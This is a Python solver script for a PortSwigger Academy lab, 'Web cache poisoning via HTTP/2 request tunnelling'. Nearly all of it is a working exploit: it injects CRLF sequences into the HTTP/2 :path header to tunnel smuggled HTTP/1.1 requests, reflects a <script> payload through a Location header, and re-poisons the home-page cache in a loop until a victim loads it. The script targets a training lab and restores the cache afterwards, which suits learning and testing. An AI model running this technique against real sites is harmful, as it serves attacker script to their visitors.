#!/usr/bin/env python3
"""Solver for PortSwigger Academy lab: "Web cache poisoning via HTTP/2 request
tunnelling" (EXPERT, HTTP request smuggling / request tunnelling).

Objective: poison the cache for the home page so that the victim, who visits
``/`` every 15 seconds, executes ``alert(1)`` in their browser.

Where the vulnerability lives
-----------------------------
The front-end terminates TLS and speaks HTTP/2, then downgrades every request
to HTTP/1.1 for the back-end. It does not sanitize the ``:path`` pseudo-header
before writing it into the HTTP/1.1 request line, so a CRLF inside ``:path``
ends the outer request and appends attacker-chosen requests to it.

The front-end does not reuse back-end connections, so classic smuggling is
useless -- but *tunnelling* works: for a HEAD request the front-end trusts the
back-end's ``Content-Length`` and keeps reading that many "body" bytes from the
socket. Those bytes are actually the responses to the smuggled requests, and
the front-end caches them under the cache key of the outer request. The outer
request line stays valid (``HEAD /``), so the poisoned key is ``/``.

The first smuggled request is ``GET /resources?<script>alert(1)</script>``,
which answers ``302`` with an unescaped ``Location`` header echoing the query.
The cached body therefore starts with a live ``<script>`` tag. Because the
front-end only caches as many bytes as the outer ``Content-Length``, further
smuggled requests (ordinary ``/post?postId=N`` pages) are pipelined after it to
fill the rest of the read; without them the front-end blocks on a short read.

Flow
----
0. Baseline: read the lab's solved widget and the home page Content-Length.
1. Pick enough ordinary pages to fill the outer Content-Length.
2. Control: tunnel through a cache-busted outer URL (``/?cb=...``) and confirm
   the tunnelled response lands in that cache entry -- proves the primitive
   without touching ``/``.
3. If the lab is already solved, stop here and say so honestly.
4. Poison ``/``: repeat the tunnelled HEAD every few seconds (an entry only
   reaches the back-end on a cache miss, so the loop re-arms it right after the
   cache's 30 s TTL expires) until the lab's own solved widget flips.
5. Restore a clean home-page cache entry so the instance (and the repo
   launcher's title lookup) sees the real page again.

Usage:
    uv run python solve.py --url https://<instance>.web-security-academy.net
    uv run python solve.py --url <url> --wait 300 --interval 3

Exit 0 only when the lab itself reports ``is-solved``; 2 for a bad/expired
target; 1 for a genuine failure.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import socket
import ssl
import sys
import time
from urllib.parse import urlsplit

import h2.config
import h2.connection
import h2.events
from h2.stream import H2Stream

# The front-end returns the tunnelled HTTP/1 bytes as an HTTP/2 DATA frame even
# for a HEAD stream; stock h2 validates HEAD responses against a content length
# of 0 and aborts. This client only parses lab responses, never relays them.
H2Stream._track_content_length = lambda self, length, end_stream=False: None  # type: ignore[assignment]

PAYLOAD = "<script>alert(1)</script>"
USER_AGENT = "Mozilla/5.0 (PortSwigger solver: h2 request tunnelling cache poison)"
STATUS_RE = re.compile(r"widgetcontainer-lab-status\s+(is-solved|is-notsolved)")
TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
CACHE_TTL = 30.0  # the lab's cache-control: max-age=30
MAX_PAGES = 4     # pipelined filler pages (each ~12 KB) is plenty of margin


def log(msg: str) -> None:
    print(f"[*] {msg}", flush=True)


def ok(msg: str) -> None:
    print(f"[+] {msg}", flush=True)


def fail(msg: str) -> None:
    print(f"[-] {msg}", flush=True)


def rand_tag(n: int = 8) -> str:
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(n))


def hget(headers, name: str) -> str | None:
    for k, v in headers:
        if k.lower() == name.lower():
            return v
    return None


class H2Lab:
    """Minimal HTTP/2 client that can put arbitrary bytes in :path."""

    def __init__(self, base_url: str, timeout: float = 20.0) -> None:
        parts = urlsplit(base_url)
        if parts.scheme not in ("http", "https"):
            raise ValueError(f"unsupported scheme: {parts.scheme!r}")
        self.host = parts.hostname or ""
        if not self.host:
            raise ValueError("URL has no host")
        self.port = parts.port or (443 if parts.scheme == "https" else 80)
        self.tls = parts.scheme == "https"
        self.timeout = timeout
        self.requests = 0
        here = os.path.dirname(os.path.abspath(__file__))
        self.evidence_dir = os.path.join(here, "evidence")
        self.logs_dir = os.path.join(here, "logs")
        os.makedirs(self.evidence_dir, exist_ok=True)
        os.makedirs(self.logs_dir, exist_ok=True)
        self.request_log_path = os.path.join(self.evidence_dir, "requests.jsonl")
        self.event_log_path = os.path.join(self.evidence_dir, "events.jsonl")

    # -- low level ---------------------------------------------------------
    def _connect(self):
        if not self.tls:
            return socket.create_connection((self.host, self.port), timeout=self.timeout)
        ctx = ssl.create_default_context()
        # The lab speaks HTTP/2 but does not advertise it via ALPN, so complete
        # the TLS handshake as http/1.1 and send the h2 preface anyway.
        ctx.set_alpn_protocols(["http/1.1"])
        raw = socket.create_connection((self.host, self.port), timeout=self.timeout)
        return ctx.wrap_socket(raw, server_hostname=self.host)

    def request(self, method: str, path: str, extra_headers=None, body: bytes = b"",
                tag: str = "") -> tuple[int | None, list[tuple[str, str]], bytes]:
        headers = [(":method", method), (":scheme", "https" if self.tls else "http"),
                   (":authority", self.host), (":path", path), ("user-agent", USER_AGENT)]
        headers.extend(extra_headers or [])

        cfg = h2.config.H2Configuration(
            client_side=True, header_encoding="utf-8",
            validate_outbound_headers=False, normalize_outbound_headers=False)
        conn = h2.connection.H2Connection(config=cfg)
        sock = None
        status: int | None = None
        resp_headers: list[tuple[str, str]] = []
        data = b""
        try:
            sock = self._connect()
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, headers, end_stream=not body)
            if body:
                conn.send_data(sid, body, end_stream=True)
            sock.sendall(conn.data_to_send())
            self.requests += 1
            while True:
                try:
                    chunk = sock.recv(65535)
                except (socket.timeout, ssl.SSLError, OSError):
                    break
                if not chunk:
                    break
                done = False
                for ev in conn.receive_data(chunk):
                    if isinstance(ev, h2.events.ResponseReceived):
                        resp_headers = [(str(k), str(v)) for k, v in ev.headers]
                        for k, v in ev.headers:
                            if str(k) == ":status":
                                try:
                                    status = int(v)
                                except (TypeError, ValueError):
                                    pass
                    elif isinstance(ev, h2.events.DataReceived):
                        data += ev.data
                        try:
                            conn.acknowledge_received_data(ev.flow_controlled_length,
                                                           ev.stream_id)
                        except Exception:  # noqa: BLE001 - stream may already be closed
                            pass
                    elif isinstance(ev, h2.events.StreamEnded):
                        done = True
                if done:
                    break
                out = conn.data_to_send()
                if out:
                    sock.sendall(out)
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        self._record(tag or f"{method} {path}", method, path, extra_headers or [],
                     body, status, resp_headers, data)
        return status, resp_headers, data

    def _record(self, tag, method, path, extra, body, status, resp_headers, data) -> None:
        """Append request/response evidence, redacting session cookies."""
        def scrub(value: str) -> str:
            return re.sub(r"(session=)[^;\s]+", r"\1<redacted>", value)

        entry = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
            "tag": tag,
            "method": method,
            "path": path if len(path) < 400 else path[:400] + f"...(+{len(path) - 400})",
            "path_len": len(path),
            "crlf_in_path": "\r\n" in path,
            "status": status,
            "response_headers": {scrub(k): scrub(v) for k, v in resp_headers},
            "response_len": len(data),
        }
        with open(self.request_log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry) + "\n")
        slug = re.sub(r"[^A-Za-z0-9_.-]+", "_", tag)[:80] or "response"
        with open(os.path.join(self.evidence_dir, f"{slug}.raw"), "wb") as fh:
            fh.write(data)

    def event(self, kind: str, **fields) -> None:
        rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "event": kind, **fields}
        with open(self.event_log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")

    # -- helpers -----------------------------------------------------------
    def get(self, path: str, tag: str = "") -> tuple[int | None, list[tuple[str, str]], bytes]:
        return self.request("GET", path, tag=tag or f"GET {path}")

    def tunnel_head(self, outer_path: str, page_ids: list[int],
                    tag: str = "") -> tuple:
        """HEAD <outer_path> with pipelined HTTP/1.1 requests injected via :path.

        The first smuggled request reflects the XSS payload in a ``Location``
        header; the following ``/post`` requests supply filler bytes so the
        front-end's over-read of the outer Content-Length completes. The final
        ``Foo: bar`` line absorbs the `` HTTP/1.1`` suffix the front-end appends
        while rewriting the request line.
        """
        inner = (f"GET /resources?{PAYLOAD} HTTP/1.1\r\n"
                 f"Host: {self.host}\r\n"
                 f"\r\n")
        for i, pid in enumerate(page_ids):
            inner += f"GET /post?postId={pid} HTTP/1.1\r\n"
            if i + 1 < len(page_ids):
                inner += f"Host: {self.host}\r\n\r\n"
        path = (f"{outer_path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"\r\n"
                f"{inner}"
                f"Foo: bar")
        return self.request("HEAD", path, tag=tag or "tunnel HEAD")

    def widget_state(self) -> tuple[str, bytes]:
        """Read the lab's own solved widget from a cache-busted content page.

        ``/`` cannot be used while it is poisoned, and the site cache (max-age
        30) can serve a stale widget from any cached page, so every read uses a
        unique query parameter to force a cache miss.
        """
        _, _, body = self.get(f"/post?postId=1&cb={rand_tag()}", tag="read widget")
        m = STATUS_RE.search(body.decode("utf-8", "replace"))
        return (m.group(1) if m else "unknown"), body


def discover(lab: H2Lab) -> dict:
    """Baseline: title, solved widget and the outer Content-Length."""
    _, headers, body = lab.get(f"/?cb={rand_tag()}", tag="baseline")
    text = body.decode("utf-8", "replace")
    title = TITLE_RE.search(text)
    title = re.sub(r"\s+", " ", title.group(1)).strip() if title else "?"
    widget = STATUS_RE.search(text)
    widget = widget.group(1) if widget else "unknown"
    cl = hget(headers, "content-length")
    try:
        outer_cl = int(cl) if cl else len(body)
    except ValueError:
        outer_cl = len(body)
    if outer_cl <= 0:
        raise RuntimeError("home page returned an empty body")
    lab.event("baseline", title=title, widget=widget, outer_content_length=outer_cl,
              cache=hget(headers, "x-cache"))
    return {"title": title, "widget": widget, "outer_cl": outer_cl, "home": body}


def pick_pages(lab: H2Lab, need: int) -> list[int]:
    """Choose ordinary pages whose bodies fill the front-end's over-read."""
    pages: list[int] = []
    total = 0
    for pid in range(1, MAX_PAGES + 1):
        status, headers, body = lab.get(f"/post?postId={pid}&cb={rand_tag()}",
                                        tag=f"filler size postId={pid}")
        if status != 200:
            continue
        try:
            cl = int(hget(headers, "content-length") or len(body))
        except ValueError:
            cl = len(body)
        pages.append(pid)
        total += cl + 200  # + the /resources 302 header block
        if total >= need + 512:
            break
    log(f"filler pages: {pages} ({total} bytes available for a {need}-byte read)")
    return pages


def poison_home(lab: H2Lab, page_ids: list[int], outer: str = "/",
                tag: str = "poison /") -> tuple[str | None, int, bool]:
    """Tunnel through ``outer`` and report (cache state, h2 status, payload seen)."""
    status, headers, data = lab.tunnel_head(outer, page_ids, tag=tag)
    return hget(headers, "x-cache"), status or 0, PAYLOAD.encode() in data


def control_tunnel(lab: H2Lab, page_ids: list[int]) -> bool:
    """Prove the primitive on a throwaway cache key before touching ``/``."""
    key = f"/?cb={rand_tag()}"
    status, headers, data = lab.tunnel_head(key, page_ids,
                                           tag="control tunnel (cachebuster)")
    captured = PAYLOAD.encode() in data
    _, check_headers, check_body = lab.get(key, tag="control cache read")
    cached = PAYLOAD.encode() in check_body
    lab.event("control_tunnel", outer=key, h2_status=status, captured_bytes=len(data),
              payload_in_tunnel=captured, cache=hget(check_headers, "x-cache"),
              payload_in_cache=cached)
    if captured:
        ok(f"control: tunnelled response captured ({len(data)} bytes, payload reflected)")
    else:
        fail(f"control: no tunnelled bytes returned (h2 status {status}); "
             "check the instance is the request-tunnelling lab")
        return False
    if cached:
        ok(f"control: cache entry {key} now serves the tunnelled response "
           f"(x-cache={hget(check_headers, 'x-cache')})")
    return cached


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve 'Web cache poisoning via HTTP/2 request tunnelling'")
    ap.add_argument("--url", required=True, help="lab instance base URL")
    ap.add_argument("--wait", type=float, default=180.0,
                    help="seconds to keep the home-page cache poisoned (default 180)")
    ap.add_argument("--interval", type=float, default=3.0,
                    help="seconds between poison attempts (default 3)")
    ap.add_argument("--timeout", type=float, default=20.0, help="socket timeout")
    args = ap.parse_args()

    started = time.time()
    try:
        lab = H2Lab(args.url, timeout=args.timeout)
    except ValueError as exc:
        fail(f"invalid --url: {exc}")
        return 2

    log(f"target: {lab.host}  (HTTP/2 front-end, CRLF injection in :path)")

    # ---- 0. baseline -----------------------------------------------------
    try:
        base = discover(lab)
    except (OSError, RuntimeError) as exc:
        fail(f"cannot read the lab home page ({type(exc).__name__}: {exc}) - expired?")
        return 2
    log(f"lab title: {base['title']}")
    log(f"baseline widget: {base['widget']}   outer Content-Length: {base['outer_cl']}")
    if base["outer_cl"] < 500:
        fail("home page Content-Length looks wrong; the instance may not be serving the lab")
        return 2

    # ---- 1. filler pages for the over-read -------------------------------
    try:
        page_ids = pick_pages(lab, base["outer_cl"])
    except OSError as exc:
        fail(f"cannot size the filler pages: {exc}")
        return 1
    if not page_ids:
        fail("no filler pages available on this instance")
        return 1

    # ---- 2. control: prove tunnelling + caching on a throwaway key --------
    if not control_tunnel(lab, page_ids):
        fail("request tunnelling did not reproduce on this instance")
        return 1

    if base["widget"] == "is-solved":
        ok("this instance already reports the lab as solved")
        print("[=] caused by this solver: no (instance was already solved)")
        print(f"[=] requests: {lab.requests}  elapsed: {time.time() - started:.1f}s")
        return 0

    # ---- 3. keep the home page poisoned until the victim runs it ----------
    log(f"poisoning the / cache every {args.interval:.0f}s for up to {args.wait:.0f}s "
        "(victim visits every 15s)")
    deadline = time.time() + args.wait
    solved = False
    widget = base["widget"]
    poisons = 0
    hits = 0
    payload_served = False
    last_live_check = 0.0

    while time.time() < deadline:
        try:
            cache, status, in_tunnel = poison_home(lab, page_ids)
        except OSError as exc:
            fail(f"poison request failed: {exc}")
            time.sleep(2.0)
            continue

        if cache == "miss":
            poisons += 1
            log(f"poison shipped to the back-end (h2 {status}, tunnelled bytes carry the "
                f"payload: {'yes' if in_tunnel else 'no'})")
        elif cache == "hit":
            hits += 1

        # Independent check that `/` is really serving our bytes right now.
        if time.time() - last_live_check > CACHE_TTL / 3:
            last_live_check = time.time()
            try:
                _, vheaders, vbody = lab.get("/", tag="verify poisoned home")
                payload_served = PAYLOAD.encode() in vbody
                lab.event("poison_live", cache=hget(vheaders, "x-cache"),
                          payload_served=payload_served, bytes=len(vbody))
                if payload_served:
                    ok(f"/ is serving the tunnelled response "
                       f"(x-cache={hget(vheaders, 'x-cache')}, {len(vbody)} bytes)")
            except OSError as exc:
                fail(f"live check failed: {exc}")

        try:
            widget, _ = lab.widget_state()
        except OSError:
            widget = "unknown"
        if widget == "is-solved":
            solved = True
            break
        time.sleep(args.interval)

    # ---- 4. restore a clean home-page entry for the instance -------------
    log("waiting for the poisoned entry to expire and restoring a clean / entry")
    clean = False
    restore_deadline = time.time() + CACHE_TTL + 30
    while time.time() < restore_deadline:
        try:
            _, _, body = lab.get("/", tag="restore clean home")
        except OSError:
            body = b""
        if b"<title>" in body and PAYLOAD.encode() not in body:
            clean = True
            break
        time.sleep(3.0)
    if clean:
        ok("home page cache entry restored (real page served again)")
    else:
        fail("home page cache entry still poisoned; it expires within 30s on its own")

    elapsed = time.time() - started
    lab.event("finished", solved=solved, poisons=poisons, cache_hits=hits,
              widget=widget, requests=lab.requests, elapsed=round(elapsed, 1))

    print()
    print(f"[=] lab widget      : {'is-solved' if solved else widget}")
    print(f"[=] poison attempts : {poisons} (reached the back-end) / {hits} cache hit(s)")
    print(f"[=] payload served  : {'yes' if payload_served else 'not observed'}")
    print(f"[=] clean home      : {'yes' if clean else 'no'}")
    print(f"[=] HTTP requests   : {lab.requests}")
    print(f"[=] elapsed         : {elapsed:.1f}s")
    print(f"[=] evidence        : {lab.evidence_dir}")
    print(f"[=] caused by solver: {'yes' if solved else 'no'}")

    if solved:
        ok("LAB SOLVED - the home-page cache served a response that runs alert(1)")
        return 0
    fail("cache was poisoned but the lab widget never flipped; rerun with a larger --wait")
    return 1


if __name__ == "__main__":
    sys.exit(main())
